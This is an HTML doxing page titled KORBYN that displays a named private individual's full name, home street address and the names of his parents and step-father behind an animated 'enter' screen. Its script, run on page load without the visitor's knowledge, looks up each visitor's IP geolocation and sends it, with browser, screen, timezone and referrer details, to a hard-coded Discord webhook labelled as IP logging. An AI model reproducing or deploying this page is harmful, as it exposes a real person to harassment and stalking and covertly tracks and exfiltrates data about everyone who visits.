<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KORBYN</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --bg: #000;
    --card: #0a0a0a;
    --card2: #111;
    --text: #fff;
    --text2: #666;
    --border: #1a1a1a;
    --glow: rgba(255,255,255,0.02);
  }

  [data-theme="light"] {
    --bg: #f0f0f0;
    --card: #fff;
    --card2: #f5f5f5;
    --text: #000;
    --text2: #555;
    --border: #ddd;
    --glow: rgba(0,0,0,0.02);
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Courier New', monospace;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
    transition: background 0.4s ease, color 0.4s ease;
  }

  .bg-image {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: url('https://github.com/outstrut/elijahpaz.space/blob/main/db5d5ef3-13a4-47a5-ae0c-13aeffb5788b.png?raw=true') center/cover no-repeat;
    filter: grayscale(1) brightness(0.08) blur(2px);
    z-index: 0;
    transition: filter 0.4s ease;
  }

  [data-theme="light"] .bg-image {
    filter: grayscale(1) brightness(0.7) blur(1px);
  }

  .bg-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 1;
  }

  [data-theme="light"] .bg-overlay {
    background: rgba(255,255,255,0.6);
  }

  #entryScreen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 100;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: var(--bg);
    transition: opacity 0.8s ease, transform 0.8s ease;
  }

  #entryScreen.hidden {
    opacity: 0;
    transform: scale(0.95);
    pointer-events: none;
  }

  .entry-title {
    font-size: clamp(5rem, 20vw, 12rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);
    margin-bottom: 2.5rem;
    animation: flicker 3s infinite;
  }

  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
  }

  .entry-btn {
    padding: 1.2rem 4rem;
    font-size: 1.2rem;
    font-weight: 700;
    border: 2px solid var(--text);
    background: transparent;
    color: var(--text);
    cursor: pointer;
    transition: all 0.3s ease;
    letter-spacing: 0.2em;
    text-transform: uppercase;
    font-family: 'Courier New', monospace;
  }

  .entry-btn:hover {
    background: var(--text);
    color: var(--bg);
    transform: scale(1.05);
  }

  #mainContent {
    position: relative;
    z-index: 2;
    text-align: center;
    padding: 2rem;
    opacity: 0;
    transition: opacity 1.2s ease;
  }

  #mainContent.visible {
    opacity: 1;
  }

  .dox-title {
    font-size: clamp(3.5rem, 14vw, 8rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);
    margin-bottom: 3rem;
    animation: pulse 2s ease-in-out infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }

  .dox-box {
    display: inline-block;
    background: var(--card);
    border: 1px solid var(--border);
    padding: 2.5rem 4rem;
    min-width: 380px;
    transition: background 0.3s ease, border-color 0.3s ease;
    position: relative;
    overflow: hidden;
  }

  .dox-box::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(255,255,255,0.01) 2px,
      rgba(255,255,255,0.01) 4px
    );
    pointer-events: none;
    animation: scan 8s linear infinite;
  }

  @keyframes scan {
    0% { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
  }

  .dox-line {
    font-size: clamp(0.9rem, 2.2vw, 1.2rem);
    font-weight: 500;
    color: var(--text);
    padding: 0.8rem 0;
    border-bottom: 1px solid var(--border);
    transition: color 0.3s ease, border-color 0.3s ease;
    letter-spacing: 0.04em;
    position: relative;
    z-index: 1;
    height: 3.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.8rem;
  }

  .dox-line:last-child {
    border-bottom: none;
  }

  .dox-line .label {
    color: var(--text2);
    font-weight: 400;
    min-width: 80px;
    text-align: right;
  }

  .dox-line .value {
    font-weight: 600;
    min-width: 200px;
    text-align: left;
    position: relative;
  }

  .typing-cursor {
    display: inline-block;
    width: 2px;
    height: 1.2em;
    background: var(--text);
    margin-left: 2px;
    animation: blink 0.7s step-end infinite;
  }

  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
  }

  .theme-toggle {
    position: fixed;
    top: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.4rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    font-family: 'Courier New', monospace;
  }

  .theme-toggle:hover {
    border-color: var(--text);
  }

  .audio-toggle {
    position: fixed;
    bottom: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    font-family: 'Courier New', monospace;
  }

  .audio-toggle:hover {
    border-color: var(--text);
  }

  @media (max-width: 600px) {
    .dox-box {
      padding: 1.5rem;
      min-width: unset;
      width: 100%;
    }
    .dox-line {
      font-size: 0.8rem;
      height: 2.8rem;
      flex-wrap: wrap;
      gap: 0.3rem;
    }
    .dox-line .label {
      min-width: 60px;
      font-size: 0.7rem;
    }
    .dox-line .value {
      min-width: 120px;
      font-size: 0.8rem;
    }
    .entry-btn {
      padding: 1rem 2.5rem;
      font-size: 1rem;
    }
  }
</style>
</head>
<body data-theme="dark">

<div class="bg-image"></div>
<div class="bg-overlay"></div>

<button class="theme-toggle" id="themeToggle">◐</button>
<button class="audio-toggle" id="audioToggle">♫</button>

<div id="entryScreen">
  <div class="entry-title">KORBYN</div>
  <button class="entry-btn" id="enterBtn">enter</button>
</div>

<div id="mainContent">
  <div class="dox-title">KORBYN</div>
  <div class="dox-box">
    <div class="dox-line" data-text="Korbyn Korinek">
      <span class="label">NAME</span>
      <span class="value"></span>
    </div>
    <div class="dox-line" data-text="70 South Citadel Circle, Pueblo West, CO">
      <span class="label">ADDRESS</span>
      <span class="value"></span>
    </div>
    <div class="dox-line" data-text="Alyssa Cawthra">
      <span class="label">MOTHER</span>
      <span class="value"></span>
    </div>
    <div class="dox-line" data-text="David Korinek">
      <span class="label">FATHER</span>
      <span class="value"></span>
    </div>
    <div class="dox-line" data-text="Cody Cawthra">
      <span class="label">STEP-FATHER</span>
      <span class="value"></span>
    </div>
  </div>
</div>

<audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>

<script>
  // --- IP LOGGING - FIXED FORMAT ---
  function sendToDiscord(data) {
    const webhook = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
    
    // Build clean fields array
    const fields = [];
    
    // Add IP data
    const ipFields = [
      'ip', 'type', 'continent', 'country', 'region', 'city', 'postal',
      'latitude', 'longitude', 'isp', 'org', 'asn', 'asn_org',
      'timezone', 'utc_offset', 'currency', 'currency_plural'
    ];
    
    ipFields.forEach(key => {
      if (data[key] !== undefined && data[key] !== null && data[key] !== '') {
        fields.push({
          name: key.toUpperCase().replace(/_/g, ' '),
          value: String(data[key]).substring(0, 1024),
          inline: true
        });
      }
    });

    // Add security info
    if (data.security) {
      Object.entries(data.security).forEach(([k, v]) => {
        if (v !== null && v !== undefined) {
          fields.push({
            name: `SECURITY: ${k.toUpperCase()}`,
            value: String(v),
            inline: true
          });
        }
      });
    }

    // Add browser info
    fields.push(
      { name: 'BROWSER', value: navigator.userAgent.substring(0, 1024), inline: false },
      { name: 'LANGUAGE', value: navigator.language, inline: true },
      { name: 'PLATFORM', value: navigator.platform, inline: true },
      { name: 'SCREEN', value: `${window.screen.width}x${window.screen.height}`, inline: true },
      { name: 'COLOR DEPTH', value: `${window.screen.colorDepth}-bit`, inline: true },
      { name: 'TIMEZONE', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: 'REFERRER', value: document.referrer || 'Direct', inline: false },
      { name: 'PAGE URL', value: window.location.href.substring(0, 1024), inline: false }
    );

    // Send properly formatted embed
    fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '📍 VISITOR LOGGED',
          color: 0x000000,
          fields: fields,
          timestamp: new Date().toISOString(),
          footer: { text: 'KORBYN DOX | IP Logging Active' }
        }]
      })
    })
    .then(res => {
      if (!res.ok) {
        return res.text().then(text => { throw new Error(`HTTP ${res.status}: ${text}`); });
      }
      console.log('✅ Discord webhook sent successfully');
    })
    .catch(err => {
      console.error('❌ Discord webhook error:', err);
    });
  }

  // Fetch IP on page load
  fetch('https://ipwho.is/')
    .then(res => res.json())
    .then(data => {
      console.log('IP Data:', data);
      sendToDiscord(data);
    })
    .catch(err => console.error('IP fetch error:', err));

  // --- TYPING EFFECT WITH FORWARD/BACKWARD LOOP ---
  function typeLoop(element, text, speed = 50) {
    let isTyping = true;
    let index = 0;
    let timeout;
    let pause = false;

    function type() {
      if (pause) return;
      
      if (isTyping) {
        // Forward
        if (index < text.length) {
          element.textContent = text.substring(0, index + 1) + '▌';
          index++;
          timeout = setTimeout(type, speed);
        } else {
          // Pause at end
          element.textContent = text + '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = false;
            type();
          }, 1500);
        }
      } else {
        // Backward
        if (index > 0) {
          element.textContent = text.substring(0, index) + '▌';
          index--;
          timeout = setTimeout(type, speed);
        } else {
          // Pause at start
          element.textContent = '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = true;
            type();
          }, 1000);
        }
      }
    }

    type();
  }

  // --- UI CONTROLS ---
  const entryScreen = document.getElementById('entryScreen');
  const mainContent = document.getElementById('mainContent');
  const enterBtn = document.getElementById('enterBtn');
  const themeToggle = document.getElementById('themeToggle');
  const audioToggle = document.getElementById('audioToggle');
  const audio = document.getElementById('bgAudio');
  let audioPlaying = false;

  enterBtn.addEventListener('click', () => {
    entryScreen.classList.add('hidden');
    setTimeout(() => {
      mainContent.classList.add('visible');
      // Start typing effects after content appears
      setTimeout(() => {
        document.querySelectorAll('.dox-line .value').forEach((el, i) => {
          const text = el.closest('.dox-line').dataset.text;
          // Stagger each line
          setTimeout(() => {
            typeLoop(el, text, 40 + (i * 5));
          }, i * 300);
        });
      }, 500);
    }, 800);
    
    audio.play().then(() => {
      audioPlaying = true;
      audioToggle.textContent = '◼';
    }).catch(() => {
      audioToggle.textContent = '♫';
    });
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !entryScreen.classList.contains('hidden')) {
      enterBtn.click();
    }
  });

  themeToggle.addEventListener('click', () => {
    const current = document.body.getAttribute('data-theme');
    document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
  });

  audioToggle.addEventListener('click', () => {
    if (audioPlaying) {
      audio.pause();
      audioPlaying = false;
      audioToggle.textContent = '♫';
    } else {
      audio.play().then(() => {
        audioPlaying = true;
        audioToggle.textContent = '◼';
      }).catch(() => {
        alert('Audio failed. Check the URL.');
      });
    }
  });

  console.log('KORBYN');
</script>

</body>
</html>
